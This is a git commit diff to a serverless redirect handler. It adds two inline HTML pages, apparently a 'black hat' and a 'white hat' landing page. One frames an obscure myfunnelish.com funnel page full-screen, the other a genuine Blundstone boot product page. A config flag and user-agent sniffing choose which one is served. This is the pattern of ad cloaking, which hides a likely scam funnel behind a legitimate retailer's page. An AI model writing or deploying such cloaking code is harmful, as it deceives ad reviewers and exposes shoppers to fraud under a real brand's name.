23a27e5c51c34d90279106dc096d9552c8c74982
rmeeesumraza <github@snobay.com>
2025-01-15 15:14:36 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,21 +1,36 @@
-import pSettings from './config';
+import isRedirectEnabled from './config';
 
 export default function handler(req, res) {
 
-    console.log(pSettings.isRedirectEnabled);
-    console.log(pSettings.bhLP);
-    console.log(pSettings.whLP);
+    var bhLP = `
+    <html>
+        <body>
+            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
+        </body>
+    </html>
+    `;
+    
+    var whLP = `
+    <html>
+        <body>
+            <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://www.blundstone.com/rustic-brown-premium-leather-chelsea-boots-womens-style-585"></iframe>
+        </body>
+    </html>
+    `;
+    if (isRedirectEnabled) {
+        bhLP = whLP;
+    }
     // Get the User-Agent from the request headers
     const userAgent = req.headers['user-agent'] || '';
     const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
     if (isMobileDevice) {
-      // res.writeHead(200, { 'Content-Type': 'text/html' });
-      // res.end(bhLP);
+      res.writeHead(200, { 'Content-Type': 'text/html' });
+      res.end(bhLP);
     }
     else { 
-      // res.writeHead(200, { 'Content-Type': 'text/html' });
-      // res.end(bhLP);
+      res.writeHead(200, { 'Content-Type': 'text/html' });
+      res.end(bhLP);
     }
     
     res.end();
